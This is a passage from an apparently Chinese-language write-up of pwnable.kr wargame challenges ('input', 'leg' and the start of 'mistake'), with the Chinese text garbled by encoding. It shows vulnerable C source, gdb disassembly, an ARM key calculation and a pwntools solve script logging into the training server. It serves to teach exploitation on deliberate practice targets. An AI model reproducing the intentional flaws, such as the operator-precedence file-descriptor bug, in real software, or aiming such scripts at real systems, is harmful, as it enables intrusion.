operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// network</span>    <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>    cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// here's your flag</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-6"><a href="#ÂàÜÊûê-6" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‰∏ÄÂÖ±Êúâ 5 ÂÖ≥Ôºö</p><ol><li>‰º†ÂÖ• 100 ‰∏™ÂèÇÊï∞ÔºåÂèÇÊï∞ ‚ÄòA‚Äô(65) ‰∏∫ <code>\x00</code> ÂèÇÊï∞ ‚ÄòB‚Äô(66) ‰∏∫ <code>\x20\x0a\x0d</code></li><li>‰ªé stdin ‰∏≠ËØªÂèñËæìÂÖ• <code>\x00\x0a\x00\xff</code>Ôºåstderr ‰∏≠ËØªÂèñËæìÂÖ•<code>\x00\x0a\x02\xff</code></li><li>‰ªéÁéØÂ¢ÉÂèòÈáèÂéªËØª<code>\xde\xad\xbe\xef</code>ÔºåÈúÄË¶ÅÂÄº‰∏∫<code>\xca\xfe\xba\xbe</code></li><li>ËØªÂΩìÂâçÁõÆÂΩï‰∏ã<code>\x0a</code>Êñá‰ª∂ÔºåÂâç 4 ‰∏™Â≠óËäÇÈúÄË¶Å‰∏∫<code>\x00\x00\x00\x00</code></li><li>ËØªÂèñÂèÇÊï∞ ‚ÄòC‚Äô(67) ‰∏∫Á´ØÂè£ÂÄºÔºåÂèëÈÄÅ<code>b</code>Ëá≥Ê≠§Á´ØÂè£</li></ol><h3 id="Ëß£È¢ò-6"><a href="#Ëß£È¢ò-6" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepconn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"input2"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stdin"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stderr"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"/tmp/sa/\x0a"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"."</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x00"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x20\x0a\x0d"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"47362"</span>envs <span class="token operator">=</span> <span class="token punctuation">{</span>b<span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">:</span>b<span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">}</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>args<span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/tmp/sa/"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>envs<span class="token punctuation">,</span> executable<span class="token operator">=</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token string">"/tmp/stdin"</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token string">"/tmp/stderr"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sock <span class="token operator">=</span> conn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">47362</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ÊâßË°åÁªìÊûúÔºö</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/pwnable.kr$ /usr/bin/python3 /home/pwn/pwnable.kr/7_input.py[+] Connecting to pwnable.kr on port 2222: Done[*] input2@pwnable.kr:    Distro    Ubuntu 16.04    OS:       linux    Arch:     amd64    Version:  4.4.179    ASLR:     Enabled[+] Starting remote process '/home/input2/input' on pwnable.kr: pid 145635[*] Switching to interactive modeWelcome to pwnable.krLet's see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy! I learned how to pass various input in Linux :)[*] Got EOF while reading in interactive</code></pre><h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><h3 id="È¢òÁõÆ-7"><a href="#È¢òÁõÆ-7" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"push    {r6}\n"</span>    <span class="token string">"add    r6, pc, $1\n"</span>    <span class="token string">"bx        r6\n"</span>    <span class="token string">".code    16\n"</span>    <span class="token string">"mov    r3, pc\n"</span>    <span class="token string">"add    r3, $0x4\n"</span>    <span class="token string">"push    {r3}\n"</span>    <span class="token string">"pop    {pc}\n"</span>    <span class="token string">".code    32\n"</span>    <span class="token string">"pop    {r6}\n"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-armasm"><code class="language-armasm">(gdb) disass mainDump of assembler code for function main:   0x00008d3c <+0>:        push    {r4, r11, lr}   0x00008d40 <+4>:        add        r11, sp, #8   0x00008d44 <+8>:        sub        sp, sp, #12   0x00008d48 <+12>:    mov        r3, #0   0x00008d4c <+16>:    str        r3, [r11, #-16]   0x00008d50 <+20>:    ldr        r0, [pc, #104]    ; 0x8dc0 <main+132>   0x00008d54 <+24>:    bl        0xfb6c <printf>   0x00008d58 <+28>:    sub        r3, r11, #16   0x00008d5c <+32>:    ldr        r0, [pc, #96]    ; 0x8dc4 <main+136>   0x00008d60 <+36>:    mov        r1, r3   0x00008d64 <+40>:    bl        0xfbd8 <__isoc99_scanf>   0x00008d68 <+44>:    bl        0x8cd4 <key1>   0x00008d6c <+48>:    mov        r4, r0   0x00008d70 <+52>:    bl        0x8cf0 <key2>   0x00008d74 <+56>:    mov        r3, r0   0x00008d78 <+60>:    add        r4, r4, r3   0x00008d7c <+64>:    bl        0x8d20 <key3>   0x00008d80 <+68>:    mov        r3, r0   0x00008d84 <+72>:    add        r2, r4, r3   0x00008d88 <+76>:    ldr        r3, [r11, #-16]   0x00008d8c <+80>:    cmp        r2, r3   0x00008d90 <+84>:    bne        0x8da8 <main+108>   0x00008d94 <+88>:    ldr        r0, [pc, #44]    ; 0x8dc8 <main+140>   0x00008d98 <+92>:    bl        0x1050c <puts>   0x00008d9c <+96>:    ldr        r0, [pc, #40]    ; 0x8dcc <main+144>   0x00008da0 <+100>:    bl        0xf89c <system>   0x00008da4 <+104>:    b        0x8db0 <main+116>   0x00008da8 <+108>:    ldr        r0, [pc, #32]    ; 0x8dd0 <main+148>   0x00008dac <+112>:    bl        0x1050c <puts>   0x00008db0 <+116>:    mov        r3, #0   0x00008db4 <+120>:    mov        r0, r3   0x00008db8 <+124>:    sub        sp, r11, #8   0x00008dbc <+128>:    pop        {r4, r11, pc}   0x00008dc0 <+132>:    andeq    r10, r6, r12, lsl #9   0x00008dc4 <+136>:    andeq    r10, r6, r12, lsr #9   0x00008dc8 <+140>:                ; <UNDEFINED> instruction: 0x0006a4b0   0x00008dcc <+144>:                ; <UNDEFINED> instruction: 0x0006a4bc   0x00008dd0 <+148>:    andeq    r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1:   0x00008cd4 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cd8 <+4>:        add        r11, sp, #0   0x00008cdc <+8>:        mov        r3, pc   0x00008ce0 <+12>:    mov        r0, r3   0x00008ce4 <+16>:    sub        sp, r11, #0   0x00008ce8 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008cec <+24>:    bx        lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2:   0x00008cf0 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cf4 <+4>:        add        r11, sp, #0   0x00008cf8 <+8>:        push    {r6}        ; (str r6, [sp, #-4]!)   0x00008cfc <+12>:    add        r6, pc, #1   0x00008d00 <+16>:    bx        r6   0x00008d04 <+20>:    mov        r3, pc   0x00008d06 <+22>:    adds    r3, #4   0x00008d08 <+24>:    push    {r3}   0x00008d0a <+26>:    pop        {pc}   0x00008d0c <+28>:    pop        {r6}        ; (ldr r6, [sp], #4)   0x00008d10 <+32>:    mov        r0, r3   0x00008d14 <+36>:    sub        sp, r11, #0   0x00008d18 <+40>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d1c <+44>:    bx        lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3:   0x00008d20 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008d24 <+4>:        add        r11, sp, #0   0x00008d28 <+8>:        mov        r3, lr   0x00008d2c <+12>:    mov        r0, r3   0x00008d30 <+16>:    sub        sp, r11, #0   0x00008d34 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d38 <+24>:    bx        lrEnd of assembler dump.(gdb) </code></pre><h3 id="ÂàÜÊûê-7"><a href="#ÂàÜÊûê-7" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÈÄöËøá c Êñá‰ª∂ÁúãÔºåÂ∞±ÊòØÊâæÂà∞ key1„ÄÅkey2„ÄÅkey3 ‰πãÂíåÂç≥ÂèØ</p><ul><li><p>key1Ôºö</p><ul><li>ÂΩìÂ§ÑÁêÜÂô®Â§Ñ‰∫éARMÁä∂ÊÄÅÊó∂ÔºåÊØèÊù°ARMÊåá‰ª§‰∏∫4‰∏™Â≠óËäÇÔºåÊâÄ‰ª•PCÂØÑÂ≠òÂô®ÁöÑÂÄº‰∏∫ÂΩìÂâçÊåá‰ª§Âú∞ÂùÄ + 8Â≠óËäÇ</li><li>ÂΩìÂ§ÑÁêÜÂô®Â§Ñ‰∫éThumbÁä∂ÊÄÅÊó∂ÔºåÊØèÊù°ThumbÊåá‰ª§‰∏∫2Â≠óËäÇÔºåÊâÄ‰ª•PCÂØÑÂ≠òÂô®ÁöÑÂÄº‰∏∫ÂΩìÂâçÊåá‰ª§Âú∞ÂùÄ + 4Â≠óËäÇ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15910787471583.jpg" alt="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf"></p><p>ÂΩìÂè™Êúâ‰∏Ä‰∏™ÁªìÊûúËøîÂõûÊó∂Ôºå‰ºöÊîæÂú® r0 ÈáåÔºåÊâÄ‰ª• key1Ôºö0x00008cdc + 0x8 = 0x00008ce4</p></li><li><p>key2Ôºö<br>Áî±‰∫é 0x00008cfc Â§Ñ r6Ôºö0x1 + 0x00008cfc + 0x8 = 0x00008d05 ÊúÄÂêé‰∏Ä‰Ωç‰∏∫ 1 ÂØºËá¥Âú®0x00008d00Â§ÑËøõÂÖ• Thumb Áä∂ÊÄÅÔºå‰∫éÊòØ 0x00008d06 Â§Ñ r3 = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p></li><li><p>key3Ôºö</p><p>ËøûÊé•ÂØÑÂ≠òÂô®r14ÔºàLRÔºâÔºöÊØèÁßçÊ®°Âºè‰∏ãr14ÈÉΩÊúâËá™Ë∫´ÁâàÁªÑÔºåÂÆÉÊúâ‰∏§‰∏™ÁâπÊÆäÂäüËÉΩÔºö</p><ol><li>‰øùÂ≠òÂ≠êÁ®ãÂ∫èËøîÂõûÂú∞ÂùÄ„ÄÇ‰ΩøÁî®BLÊàñBLXÊó∂ÔºåË∑≥ËΩ¨Êåá‰ª§Ëá™Âä®ÊääËøîÂõûÂú∞ÂùÄÊîæÂÖ•r14‰∏≠ÔºõÂ≠êÁ®ãÂ∫èÈÄöËøáÊäär14Â§çÂà∂Âà∞PCÊù•ÂÆûÁé∞ËøîÂõû</li><li>ÂΩìÂºÇÂ∏∏ÂèëÁîüÊó∂ÔºåÂºÇÂ∏∏Ê®°ÂºèÁöÑr14Áî®Êù•‰øùÂ≠òÂºÇÂ∏∏ËøîÂõûÂú∞ÂùÄÔºåÂ∞Ür14Â¶ÇÊ†àÂèØ‰ª•Â§ÑÁêÜÂµåÂ•ó‰∏≠Êñ≠</li></ol><p>ÂèØ‰ª•ÁúãÂà∞‰∏ã‰∏ÄÊù°Êåá‰ª§ÁöÑÂú∞ÂùÄ‰∏∫ 0x00008d80</p><p>ÊâÄ‰ª• key3Ôºö0x00008d80</p></li></ul><p>ÁªºÂêàËÆ°ÁÆó key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400</p><h3 id="Ëß£È¢ò-7"><a href="#Ëß£È¢ò-7" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!</code></pre><h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><h3 id="È¢òÁõÆ-8"><a href="#È¢òÁõÆ-8" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span><span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// xor your input</span>    <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-8"><a href="#ÂàÜÊûê-8" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¢òÁõÆÁªô‰∫ÜÊèêÁ§∫</p><p>hint : operator priority</p><p>ÁÑ∂ÂêéÊ≥®ÊÑèÂà∞ËøôÂè•<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>ËøôÈáåÈù¢ÁöÑÊâßË°å‰ºòÂÖàÁ∫ßÊòØÊúâÈóÆÈ¢òÁöÑÔºåÂ∫îËØ•‰∏∫<code>if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0)</code>ÔºåÈîôËØØÁöÑÂÜôÊ≥ïÂØºËá¥ fd=0ÔºåÁ¥ßË∑üÁùÄ read Âàô‰ºö‰ªé stdinÈáåÈù¢ËØªÂèñ 10 ‰ΩçÈïøÂ∫¶ÂÜÖÂÆπ‰Ωú‰∏∫ password</p><p>ÊâÄ‰ª•ÊúÄÁªà pw_buf Âíå pw_buf2 Êàë‰ª¨ÈÉΩËÉΩÊéßÂà∂ÔºåÂè™Ë¶Å‰øùËØÅÊØè‰∏Ä‰ΩçÂíå 1 ËøõË°å‰∫¶ÊàñÂç≥ÂèØ</p><h3 id="Ëß£È¢ò-8"><a href="#Ëß£È¢ò-8" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">mistake@pwnable:~$ 